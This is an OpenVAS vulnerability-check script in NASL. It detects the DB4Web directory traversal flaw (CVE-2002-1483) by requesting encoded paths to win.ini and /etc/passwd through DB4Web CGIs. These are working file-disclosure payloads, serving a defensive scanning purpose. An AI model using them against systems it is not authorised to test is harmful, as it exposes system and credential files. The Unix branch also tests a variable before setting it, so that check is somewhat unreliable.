###############################################################################
# OpenVAS Vulnerability Test
# $Id: db4web_dir_trav.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# DB4Web directory traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
#
# From:Stefan.Bagdohn@guardeonic.com
# To:vulnwatch@vulnwatch.org
# Date: Thu, 19 Sep 2002 11:00:55 +0200
# Subject: Advisory: File disclosure in DB4Web

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11182");
  script_version("$Revision: 13679 $");
  script_bugtraq_id(5723);
  script_cve_id("CVE-2002-1483");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("DB4Web directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software.");

  script_tag(name:"summary", value:"It is possible to read any file on your
  system through the DB4Web software.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
host = http_host_name( dont_add_port:TRUE );

cgis = http_get_kb_cgis( port:port, host:host );
if( isnull( cgis ) ) exit( 0 );

foreach cgi( cgis ) {

  if( "/db4web_c.exe/" >< cgi ) {

    end = strstr( cgi, "/db4web_c.exe/" );
    dir = cgi - end;

    u = strcat( dir, "/db4web_c.exe/c%3A%5Cwindows%5Cwin.ini" );
    if( check_win_dir_trav_ka( port:port, url:u ) ) {
      report = report_vuln_url( port:port, url:u );
      security_message( port:port, data:report );
      exit( 0 );
    }

    u = strcat( dir, "/db4web_c.exe/c%3A%5Cwinnt%5Cwin.ini" );
    if( check_win_dir_trav_ka( port:port, url:u ) ) {
      report = report_vuln_url( port:port, url:u );
      security_message( port:port, data:report );
      exit( 0 );
    }
  } else if( "/db4web_c/" >< dir ) {

    # Unix
    end = strstr( cgi, "/db4web_c/" );
    dir = cgi - end;
    u = strcat( dir, "/db4web_c//etc/passwd" );

    req = http_get( port:port, item:u );
    res = http_keepalive_send_recv( port:port, data:req );

    if( isnull( res ) ) continue;
    if( "root:" >< res ) {
      report = report_vuln_url( port:port, url:u );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );